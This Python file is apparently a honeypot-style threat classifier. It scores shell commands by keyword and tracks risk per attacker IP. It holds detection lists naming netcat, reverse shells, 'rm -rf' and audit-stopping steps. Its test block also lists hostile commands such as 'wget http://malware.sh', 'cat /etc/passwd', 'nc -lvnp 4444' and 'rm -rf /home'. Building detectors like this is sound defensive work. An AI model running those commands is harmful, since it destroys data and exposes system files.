import uuid
from datetime import datetime

# Risk Score Mapping
RISK_SCORES = {
    "Reconnaissance": 3,
    "Malware Download Attempt": 8,
    "Permission Manipulation": 5,
    "Reverse Shell Attempt": 15,
    "SQL Injection Attempt": 12,
    "Defense Evasion": 10,
    "Persistence Creation": 12,
    "Privilege Escalation Attempt": 10,
    "Malware Execution Attempt": 14,
    "Unknown": 1
}

# Confidence Mapping
CONFIDENCE_MAPPING = {
    "Reconnaissance": 0.85,
    "Malware Download Attempt": 0.95,
    "Permission Manipulation": 0.90,
    "Reverse Shell Attempt": 0.95,
    "SQL Injection Attempt": 0.95,
    "Defense Evasion": 0.90,
    "Persistence Creation": 0.90,
    "Privilege Escalation Attempt": 0.95,
    "Malware Execution Attempt": 0.90,
    "Unknown": 0.50
}


class AttackerSession:
    def __init__(self, ip):
        self.session_id = str(uuid.uuid4())[:8]
        self.ip = ip
        self.start_time = datetime.now()
        self.commands = []
        self.risk_score = 0
        self.threat_level = "LOW"

    def add_command(self, command, attack_type):
        self.commands.append(command)
        score_add = RISK_SCORES.get(attack_type, 1)
        self.risk_score += score_add
        
        # Update Threat Level
        if self.risk_score >= 40:
            self.threat_level = "CRITICAL"
        elif self.risk_score >= 25:
            self.threat_level = "HIGH"
        elif self.risk_score >= 12:
            self.threat_level = "MEDIUM"
        else:
            self.threat_level = "LOW"

        return {
            "session_id": self.session_id,
            "ip": self.ip,
            "attack_type": attack_type,
            "risk_score": self.risk_score,
            "threat_level": self.threat_level,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }


# Global session store (for demo)
sessions = {}


def classify_command(command: str, ip: str = "192.168.1.100") -> dict:
    """
    Advanced Threat Classification with Session ID and Risk Scoring
    """
    if not command or not isinstance(command, str):
        return {"attack_type": "Unknown", "risk_score": 0, "threat_level": "LOW"}

    cmd = command.lower().strip()

    # CLASSIFICATION 
    if any(x in cmd for x in ["chmod "]):
        attack_type = "Permission Manipulation"
    elif any(x in cmd for x in ["sqlmap"]):
        attack_type = "SQL Injection Attempt"
    elif any(x in cmd for x in ["history -c", "rm -rf", "stop auditd"]):
        attack_type = "Defense Evasion"
    elif any(x in cmd for x in ["crontab", "authorized_keys", "useradd"]):
        attack_type = "Persistence Creation"
    elif any(x in cmd for x in ["find / -perm", "pkexec", "dirtycow"]):
        attack_type = "Privilege Escalation Attempt"
    elif any(x in cmd for x in ["xmrig", "minerd", "miner", "exploit", "mkdir /tmp/"]):
        attack_type = "Malware Execution Attempt"
    elif any(x in cmd for x in ["nmap", "masscan", "rustscan", "netdiscover", "arp-scan", "ping", "traceroute"]):
        attack_type = "Reconnaissance"
    elif any(x in cmd for x in ["wget", "curl", "git clone"]):
        attack_type = "Malware Download Attempt"
    elif any(x in cmd for x in ["nc -lv", "netcat", "reverse shell"]):
        attack_type = "Reverse Shell Attempt"
    else:
        attack_type = "Unknown"

    # Create or get session
    if ip not in sessions:
        sessions[ip] = AttackerSession(ip)

    # Add command and get decision
    decision = sessions[ip].add_command(command, attack_type)

    return {
        "session_id": decision["session_id"],
        "ip": ip,
        "command": command,
        "attack_type": attack_type,
        "confidence": CONFIDENCE_MAPPING.get(attack_type, 0.50),
        "risk_score": decision["risk_score"],
        "threat_level": decision["threat_level"],
        "timestamp": decision["timestamp"]
    }


# TESTING 
if __name__ == "__main__":
    print("=== Xynera Threat Classification with Session & Risk Score ===\n")
    
    test_commands = [
        "nmap -sV 192.168.1.0/24",
        "cat /etc/passwd",
        "wget http://malware.sh",
        "sudo su",
        "crontab -e",
        "nc -lvnp 4444",
        "ls -la",
        "rm -rf /home"
    ]

    for cmd in test_commands:
        result = classify_command(cmd, ip="192.168.1.100")
        print(f"Session ID : {result['session_id']}")
        print(f"Command    : {result['command']}")
        print(f"Attack Type: {result['attack_type']}")
        print(f"Risk Score : {result['risk_score']}")
        print(f"Threat     : {result['threat_level']}")
        print("-" * 70)
